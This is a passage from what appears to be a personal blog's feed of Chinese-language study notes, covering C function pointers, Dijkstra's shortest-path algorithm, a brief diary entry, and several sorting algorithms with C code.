<h2 id="u51FD_u6570_u6307_u9488"><a href="#u51FD_u6570_u6307_u9488" class="headerlink" title="函数指针"></a>函数指针</h2><h3 id="u58F0_u660E_u51FD_u6570_u6307_u9488"><a href="#u58F0_u660E_u51FD_u6570_u6307_u9488" class="headerlink" title="声明函数指针"></a>声明函数指针</h3><pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>foo<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>foo为函数指针。要注意的是，如果声明是</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token operator">*</span><span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>意义就变了，代表foo函数返回一个int型指针。</p>
<p>为函数指针声明一个类型定义会比较方便，但类型定义看起来有点奇怪，通常，类型定义的名字是声明的最后一个元素。</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>funcptr<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>举个栗子</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>funcptr<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
funcptr fptr2<span class="token punctuation">;</span>
fptr2 <span class="token operator">=</span> foo<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//     foo为函数名</span>
<span class="token function">fptr</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 调用foo函数</span>
</code></pre>
<h3 id="u4F20_u9012_u51FD_u6570_u6307_u9488"><a href="#u4F20_u9012_u51FD_u6570_u6307_u9488" class="headerlink" title="传递函数指针"></a>传递函数指针</h3><p>只要把函数指针声明最为函数参数即可。</p>
<p>举个栗子</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">int</span> num1<span class="token punctuation">,</span> <span class="token keyword">int</span> num2<span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">return</span> num1 <span class="token operator">+</span> num2<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">int</span> <span class="token function">substract</span><span class="token punctuation">(</span><span class="token keyword">int</span> num1<span class="token punctuation">,</span> <span class="token keyword">int</span> num2<span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">return</span> num1 <span class="token operator">-</span> num2<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">typedef</span> <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>fptrOperation<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">int</span> <span class="token function">compute</span><span class="token punctuation">(</span>fptrOperation operation<span class="token punctuation">,</span> <span class="token keyword">int</span> num1<span class="token punctuation">,</span> <span class="token keyword">int</span> num2<span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token function">operation</span><span class="token punctuation">(</span>num1<span class="token punctuation">,</span> num2<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<h3 id="u8FD4_u56DE_u51FD_u6570_u6307_u9488"><a href="#u8FD4_u56DE_u51FD_u6570_u6307_u9488" class="headerlink" title="返回函数指针"></a>返回函数指针</h3><p>返回函数指针需要把函数的返回类型声明为函数指针。</p>
<p>接着上一个的例子</p>
<pre class=" language-c"><code class="language-c">fptrOperation <span class="token function">select</span><span class="token punctuation">(</span><span class="token keyword">char</span> opcode<span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">switch</span><span class="token punctuation">(</span>opcode<span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">case</span> <span class="token string">'+'</span><span class="token punctuation">:</span> <span class="token keyword">return</span> add<span class="token punctuation">;</span>
        <span class="token keyword">case</span> <span class="token string">'-'</span><span class="token punctuation">:</span> <span class="token keyword">return</span> substract<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment" spellcheck="true">// evaluate函数整合了其他函数。该函数接受两个整数和一个字符，</span>
<span class="token comment" spellcheck="true">// 字符代表要做的操作，它会把opcode传递给select函数，</span>
<span class="token comment" spellcheck="true">// 后者返回要执行的函数指针。</span>
<span class="token keyword">int</span> <span class="token function">evaluate</span><span class="token punctuation">(</span><span class="token keyword">char</span> opcode<span class="token punctuation">,</span> <span class="token keyword">int</span> num1<span class="token punctuation">,</span> <span class="token keyword">int</span> num2<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    fptrOperation operation <span class="token operator">=</span> <span class="token function">select</span><span class="token punctuation">(</span>opcode<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token function">operation</span><span class="token punctuation">(</span>num1<span class="token punctuation">,</span> num2<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<h3 id="u51FD_u6570_u6307_u9488_u6570_u7EC4"><a href="#u51FD_u6570_u6307_u9488_u6570_u7EC4" class="headerlink" title="函数指针数组"></a>函数指针数组</h3><p>把函数指针声明为数组的类型。<br>接着上面的例子</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>opertation<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
operation operations<span class="token punctuation">[</span><span class="token number">128</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token constant">NULL</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">// 或者 int(*operations[128])(int, int) = {NULL};</span>
<span class="token comment" spellcheck="true">// 用指针数组来避免使用switch</span>
<span class="token keyword">void</span> <span class="token function">initializeOperationsArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    operations<span class="token punctuation">[</span><span class="token string">'+'</span><span class="token punctuation">]</span> <span class="token operator">=</span> add<span class="token punctuation">;</span>
    operations<span class="token punctuation">[</span><span class="token string">'-'</span><span class="token punctuation">]</span> <span class="token operator">=</span> subtract<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment" spellcheck="true">// 所以evaluate需要改写为evaluateArray.</span>
<span class="token keyword">int</span> <span class="token function">evaluateArray</span><span class="token punctuation">(</span><span class="token keyword">char</span> opcode<span class="token punctuation">,</span> <span class="token keyword">int</span> num1<span class="token punctuation">,</span> <span class="token keyword">int</span> num2<span class="token punctuation">)</span><span class="token punctuation">{</span>
    fptrOperation operation<span class="token punctuation">;</span>
    operation <span class="token operator">=</span> operations<span class="token punctuation">[</span>opcode<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token function">operation</span><span class="token punctuation">(</span>num1<span class="token punctuation">,</span> num2<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<h2 id="u6307_u9488_u5B89_u5168_u65B9_u9762"><a href="#u6307_u9488_u5B89_u5168_u65B9_u9762" class="headerlink" title="指针安全方面"></a>指针安全方面</h2><h3 id="u6E05_u9664_u654F_u611F_u6570_u636E"><a href="#u6E05_u9664_u654F_u611F_u6570_u636E" class="headerlink" title="清除敏感数据"></a>清除敏感数据</h3><p>复写敏感数据可以使用<code>memset</code>函数。</p>
<h2 id="u5176_u4ED6_u91CD_u8981_u5185_u5BB9"><a href="#u5176_u4ED6_u91CD_u8981_u5185_u5BB9" class="headerlink" title="其他重要内容"></a>其他重要内容</h2><ul>
<li>指针的类型转换</li>
<li>访问硬件设备</li>
<li>别名和强别名</li>
<li>使用restrict关键字</li>
<li>线程</li>
<li>面向对象技术</li>
</ul>
<p>书中最后的部分简单的提及了一些高级技巧，这块知识，我觉得还是看其他详细的书比较好。</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Dijkstra算法]]></title>
      <url>http://xinqiu.me/2015/05/30/Dijkstra's-Algorithom/</url>
      <content type="html"><![CDATA[<!--toc-->
<h2 id="u4ECB_u7ECD"><a href="#u4ECB_u7ECD" class="headerlink" title="介绍"></a>介绍</h2><p>Dijkstra算法(Dijkstra’s algorithm)是解决单源最短路径问题的一般算法。它的主要特点是以起始点为中心向外层层扩展(广度优先搜索思想)，直到扩展到终点为止。</p>
<a id="more"></a>
<h2 id="u7B97_u6CD5_u601D_u60F3"><a href="#u7B97_u6CD5_u601D_u60F3" class="headerlink" title="算法思想"></a>算法思想</h2><p>在每个阶段，Dijkstra算法选择一个顶点<code>v</code>,它在所有未知顶点中具有最小的<code>dv</code>，同时声明从<code>s</code>到<code>v</code>的最短路径是已知的。阶段的其余部分由<code>dw</code>值的更新工作组成。</p>
<p>这里先明确两个集合：所有顶点集V和已选中顶点集S。</p>
<ul>
<li><p>找到当前未选中点（V - S）中距离源点最近的点</p>
</li>
<li><p>更新未选中点到源点的距离</p>
</li>
</ul>
<p><img src="http://hi.csdn.net/attachment/201107/22/0_13113298712dnT.gif" alt=""></p>
<h2 id="u6838_u5FC3_u4EE3_u7801"><a href="#u6838_u5FC3_u4EE3_u7801" class="headerlink" title="核心代码"></a>核心代码</h2><blockquote>
<p>我觉得&lt;&lt;数据结构与算法分析–C语言描述&gt;&gt;中的伪代码言简意赅，我将在Github中放上具体实现，此处就放上书上源码。</p>
</blockquote>
<h3 id="Dijkstra_u7B97_u6CD5_u7684_u58F0_u660E"><a href="#Dijkstra_u7B97_u6CD5_u7684_u58F0_u660E" class="headerlink" title="Dijkstra算法的声明"></a>Dijkstra算法的声明</h3><pre class=" language-c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">int</span> Vertex<span class="token punctuation">;</span>

<span class="token keyword">struct</span> TableEntery
<span class="token punctuation">{</span>
    List Header<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// Adjacency list</span>
    <span class="token keyword">int</span> Known<span class="token punctuation">;</span>
    DisType Dist<span class="token punctuation">;</span>
    Vertex Path<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">// Vertices are numbered from 0</span>
<span class="token macro property"># <span class="token directive keyword">define</span> NotAVertex (-1)</span>
<span class="token keyword">typedef</span> <span class="token keyword">struct</span> TableEntery Table<span class="token punctuation">[</span>NumVertex<span class="token punctuation">]</span><span class="token punctuation">;</span>
</code></pre>
<h3 id="u8868_u521D_u59CB_u5316"><a href="#u8868_u521D_u59CB_u5316" class="headerlink" title="表初始化"></a>表初始化</h3><pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">InitTable</span><span class="token punctuation">(</span>Vertex Start<span class="token punctuation">,</span> Graph G<span class="token punctuation">,</span> Table T<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">int</span> i<span class="token punctuation">;</span>

    <span class="token function">ReadGrap</span><span class="token punctuation">(</span>G<span class="token punctuation">,</span> T<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// Read graph somehow</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> NumVertex<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        T<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>Known <span class="token operator">=</span> False<span class="token punctuation">;</span>
        T<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>Dist <span class="token operator">=</span> Infinity<span class="token punctuation">;</span>
        T<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>Path <span class="token operator">=</span> NotAVertex<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    T<span class="token punctuation">[</span>Start<span class="token punctuation">]</span><span class="token punctuation">.</span>Dist <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<h3 id="u663E_u793A_u5B9E_u9645_u6700_u77ED_u8DEF_u5F84"><a href="#u663E_u793A_u5B9E_u9645_u6700_u77ED_u8DEF_u5F84" class="headerlink" title="显示实际最短路径"></a>显示实际最短路径</h3><pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">// print shorting path to V after Dijkstra has run</span>
<span class="token comment" spellcheck="true">// Assume that the path exists</span>

<span class="token keyword">void</span> <span class="token function">PrintPath</span><span class="token punctuation">(</span>Vertex V<span class="token punctuation">,</span> Table T<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>T<span class="token punctuation">[</span>V<span class="token punctuation">]</span><span class="token punctuation">.</span>Path <span class="token operator">!=</span> NotAVertex<span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token function">PrintPath</span><span class="token punctuation">(</span>T<span class="token punctuation">[</span>V<span class="token punctuation">]</span><span class="token punctuation">.</span>Path<span class="token punctuation">,</span> T<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">" to "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%v"</span><span class="token punctuation">,</span> V<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// %v is pseudocode</span>
<span class="token punctuation">}</span>
</code></pre>
<h3 id="Dijkstra_u7B97_u6CD5_u7684_u4F2A_u4EE3_u7801"><a href="#Dijkstra_u7B97_u6CD5_u7684_u4F2A_u4EE3_u7801" class="headerlink" title="Dijkstra算法的伪代码"></a>Dijkstra算法的伪代码</h3><pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">Dijkstra</span><span class="token punctuation">(</span>Table T<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    Vertex V<span class="token punctuation">,</span> W<span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        V <span class="token operator">=</span> smallest unknown distance vertex<span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>V <span class="token operator">==</span> NotAVertex<span class="token punctuation">)</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>

        T<span class="token punctuation">[</span>V<span class="token punctuation">]</span><span class="token punctuation">.</span>Known <span class="token operator">=</span> True<span class="token punctuation">;</span>
        <span class="token keyword">for</span> each W adjacent to V
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>T<span class="token punctuation">[</span>W<span class="token punctuation">]</span><span class="token punctuation">.</span>Known<span class="token punctuation">)</span>
                <span class="token keyword">if</span><span class="token punctuation">(</span>T<span class="token punctuation">[</span>V<span class="token punctuation">]</span><span class="token punctuation">.</span>Dist <span class="token operator">+</span> Cvw <span class="token operator">&lt;</span> T<span class="token punctuation">[</span>W<span class="token punctuation">]</span><span class="token punctuation">.</span>Dist<span class="token punctuation">)</span>
                <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// Update W</span>
                    <span class="token function">Decrease</span><span class="token punctuation">(</span>T<span class="token punctuation">[</span>W<span class="token punctuation">]</span><span class="token punctuation">.</span>Dist to T<span class="token punctuation">[</span>V<span class="token punctuation">]</span><span class="token punctuation">.</span>Dist <span class="token operator">+</span> Cvw<span class="token punctuation">)</span><span class="token punctuation">;</span>
                    T<span class="token punctuation">[</span>W<span class="token punctuation">]</span><span class="token punctuation">.</span>Path <span class="token operator">=</span>  V<span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<h2 id="u603B_u7ED3"><a href="#u603B_u7ED3" class="headerlink" title="总结"></a>总结</h2><p>Dijkstra算法适用于图的边没有负值。时间复杂度也要看具体实现。</p>
<p>我个人认为，算法思路很容易理解，在代码的实现细节上可能存在一些难点。</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[一次尝试]]></title>
      <url>http://xinqiu.me/2015/05/27/Dairy-2/</url>
      <content type="html"><![CDATA[<p>晚上无聊，改了一个比较好玩的网站(虽然没有完全改好)，放在了VPS上。可以访问<code>http://web.xinqiu.me</code>[<a href="http://web.xinqiu.me" target="_blank" rel="external">Click</a>]来查看这个命令行网页。shell里有彩蛋的，大家可以去挖掘挖掘。</p>
<p>今天得到了个消息，我带领的小队参加一个小比赛进入了决赛，这是第一次参加比赛，也是第一次进入决赛。但我仍深深的觉得自己不足。虽然最后是三等奖，但我不甘心，我觉得这不是我们应该有的成绩。倒是奇怪的是，我展示以后的休息期间，评委中据说是最牛逼的个什么总经理找我聊天，和我交流了一番。</p>
<p>最近在看图论相关数据结构，这部分知识应该会比较深，书上大多数是伪代码，还要有空自己写一遍相关的实现。</p>
<p>最近的日子就是累并快乐着，但愿数据结构早点看完。</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[几种常见排序算法的学习]]></title>
      <url>http://xinqiu.me/2015/05/15/Some-Sort-Algorithm/</url>
      <content type="html"><![CDATA[<blockquote>
<p>排序算法是面试中常被提及的算法种类之一，以下记录了我学排序的一些想法。</p>
</blockquote>
<!-- toc -->
<ul>
<li><a href="#1">插入排序</a></li>
<li><a href="#2">希尔排序</a></li>
<li><a href="#3">堆排序</a></li>
<li><a href="#4">归并排序</a></li>
<li><a href="#5">快速排序</a></li>
</ul>
<a id="more"></a>
<h2 id="1">插入排序</h2>

<h3 id="u4ECB_u7ECD"><a href="#u4ECB_u7ECD" class="headerlink" title="介绍"></a>介绍</h3><p>插入排序(insertion sort)是最简单的排序算法之一。插入排序由 <code>N - 1</code> 趟(pass)排序组成。对于<code>P = 1</code> 趟到 <code>P = N - 1</code> 趟，插入算法保证从位置 0 到位置 P 上的元素为已排序状态。</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">InsertionSort</span><span class="token punctuation">(</span>ElementType A<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token keyword">int</span> N<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">int</span> j<span class="token punctuation">,</span> P<span class="token punctuation">;</span>

    ElementType Tmp<span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span>P <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> P <span class="token operator">&lt;</span> N<span class="token punctuation">;</span> P<span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        Tmp <span class="token operator">=</span> A<span class="token punctuation">[</span>P<span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span><span class="token punctuation">(</span>j <span class="token operator">=</span> P<span class="token punctuation">;</span> j <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> A<span class="token punctuation">[</span>j<span class="token number">-1</span><span class="token punctuation">]</span> <span class="token operator">></span> Tmp<span class="token punctuation">;</span> j<span class="token operator">--</span><span class="token punctuation">)</span>
            A<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> A<span class="token punctuation">[</span>j<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        A<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> Tmp<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<h3 id="u63D2_u5165_u6392_u5E8F_u7684_u5206_u6790"><a href="#u63D2_u5165_u6392_u5E8F_u7684_u5206_u6790" class="headerlink" title="插入排序的分析"></a>插入排序的分析</h3><p>嵌套循环的每一个都花费 <code>N</code> 次迭代,<br>对所有的P进行求和，得到总数为<br><img src="http://latex.codecogs.com/gif.latex?%5Csum_%7Bi%3D2%7D%5E%7BN%7Di%3D2&plus;3&plus;4&plus;...&plus;N= \Theta(N^{2}\" alt="">)</p>
<p>因此插入排序为<img src="http://chart.googleapis.com/chart?cht=tx&amp;chl=O(N^{2}\" alt="">)。</p>
<h3 id="u603B_u7ED3"><a href="#u603B_u7ED3" class="headerlink" title="总结"></a>总结</h3><p>其实就是从左到右，取每个元素，通过比较让其放在正确的位置。相比同样是<img src="http://www.forkosh.com/mathtex.cgi?%20O(N^{2}\" alt="">)的冒泡排序，插入排序减少了交换元素的次数。</p>
<h2 id="2">希尔排序</h2>

<h3 id="u4ECB_u7ECD-1"><a href="#u4ECB_u7ECD-1" class="headerlink" title="介绍"></a>介绍</h3><p>希尔排序(Shellsort)，有时也叫缩小增量排序(deminishing increment sort)，通过比较相距一定间隔的元素来工作；各趟比较所用的距离随着算法的进行而减小，直到只比较相距相邻元素的最后一趟排序为止。</p>
<p>增量的选择有多种，不同的增量，性能也不同。较为常见的是使用希尔增量。以下是以增量为<code>N / 2</code>的算法。</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">ShellSort</span><span class="token punctuation">(</span>ElementType A<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">int</span> N<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">int</span> i<span class="token punctuation">,</span>j<span class="token punctuation">,</span>Increment<span class="token punctuation">;</span>
    ElementType Tmp<span class="token punctuation">;</span>

    <span class="token keyword">for</span> <span class="token punctuation">(</span>Increment <span class="token operator">=</span> N <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span> Increment <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">;</span> Increment <span class="token operator">/</span><span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">)</span> 
    <span class="token punctuation">{</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> Increment<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> N<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> 
        <span class="token punctuation">{</span>
            Tmp <span class="token operator">=</span> A<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token keyword">for</span><span class="token punctuation">(</span>j <span class="token operator">=</span> i<span class="token punctuation">;</span> j <span class="token operator">>=</span> Increment<span class="token punctuation">;</span> j<span class="token operator">-</span><span class="token operator">=</span> Increment<span class="token punctuation">)</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>Tmp <span class="token operator">&lt;</span> A<span class="token punctuation">[</span>j <span class="token operator">-</span> Increment<span class="token punctuation">]</span><span class="token punctuation">)</span>
                    A<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> A<span class="token punctuation">[</span>j <span class="token operator">-</span> Increment<span class="token punctuation">]</span><span class="token punctuation">;</span>
                <span class="token keyword">else</span>
                    <span class="token keyword">break</span><span class="token punctuation">;</span>
            A<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> Tmp<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>###总结</p>
<p>希尔排序的性能取决于增量的选择。希尔排序说白了就是先使相同间隔的元素有序，然后缩写间隔，从而完成整个排序。</p>
<h2 id="3">堆排序</h2>

<p>###介绍</p>
<p>堆排序(heapsort)，基于优先队列可以用花费<img src="http://chart.googleapis.com/chart?cht=tx&amp;chl=O({N}\log{N}\" alt="">)时间的排序的特性。然而实践中它却慢于使用Sedgewick增量序列的希尔排序。</p>
<p>建立堆花费的时间是<img src="http://chart.googleapis.com/chart?cht=tx&amp;chl=O(N\" alt="">)，然后执行<code>N</code>次<code>DeleteMin</code>操作。按照顺序，最小的元素先离开该堆。每次<code>DeleteMin</code>花费时间<img src="http://chart.googleapis.com/chart?cht=tx&amp;chl=O(\log{N}\" alt="">),因此总的运行时间是<img src="http://chart.googleapis.com/chart?cht=tx&amp;chl=O({N}\log{N}\" alt="">).</p>
<p>该算法的主要问题在于它使用了一个附加数组。因此，存储需求增加一倍。在每次<code>DeleteMin</code>之后，堆缩小1，将堆中最后一个单元用来存放刚刚删去的元素，即可避免使用第二个数组。</p>
<h3 id="u7B97_u6CD5_u5206_u6790"><a href="#u7B97_u6CD5_u5206_u6790" class="headerlink" title="算法分析"></a>算法分析</h3><p>堆排序的过程是先建堆，后操作。</p>
<h4 id="u5EFA_u5806"><a href="#u5EFA_u5806" class="headerlink" title="建堆"></a>建堆</h4><p>将数组视为一颗完全二叉树，从其最后一个非叶子节点<code>n / 2</code>开始调整。将该节点的儿子节点中，较大的节点与该节点互换。<br><img src="http://images.cnitblog.com/blog/305504/201301/23175544-9a438436abaa4043a5f00191fbc4626b.png" alt=""></p>
<h4 id="DeleteMax"><a href="#DeleteMax" class="headerlink" title="DeleteMax"></a>DeleteMax</h4><p>将堆中最后一个元素与第一个元素交换，缩减堆的大小并进行下滤，来执行<code>N - 1</code>次DeleteMax操作。</p>
<h3 id="u603B_u7ED3-1"><a href="#u603B_u7ED3-1" class="headerlink" title="总结"></a>总结</h3><p>堆排序的总结起来就两步，建堆的部分比较重要，需要慢慢理解才能弄懂。</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">PercDown</span><span class="token punctuation">(</span>ElementType A<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token keyword">int</span> i<span class="token punctuation">,</span><span class="token keyword">int</span> N<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">int</span> Child<span class="token punctuation">;</span>
    ElementType Tmp<span class="token punctuation">;</span>

    <span class="token keyword">for</span><span class="token punctuation">(</span>Tmp <span class="token operator">=</span> A<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">LeftChild</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">&lt;</span> N<span class="token punctuation">;</span>i <span class="token operator">=</span> Child<span class="token punctuation">)</span>    
    <span class="token punctuation">{</span>
        Child <span class="token operator">=</span> <span class="token function">LeftChild</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token comment" spellcheck="true">// 以下修改可实现从大到小排序</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>Child <span class="token operator">!=</span> N <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> A<span class="token punctuation">[</span>Child <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">></span> A<span class="token punctuation">[</span>Child<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">// A[Child + 1] &lt; A[Child]</span>
            Child<span class="token operator">++</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>Tmp <span class="token operator">&lt;</span> A<span class="token punctuation">[</span>Child<span class="token punctuation">]</span><span class="token punctuation">)</span>                               <span class="token comment" spellcheck="true">// Tmp > A[Child]</span>
            A<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> A<span class="token punctuation">[</span>Child<span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">else</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    A<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> Tmp<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">void</span> <span class="token function">Heapsort</span><span class="token punctuation">(</span>ElementType A<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token keyword">int</span> N<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">int</span> i<span class="token punctuation">;</span>

    <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> N <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">--</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">// BuildHeap</span>
        <span class="token function">PercDown</span><span class="token punctuation">(</span>A<span class="token punctuation">,</span>i<span class="token punctuation">,</span>N<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> N <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>i <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">--</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">// DeletMax</span>
    <span class="token punctuation">{</span>
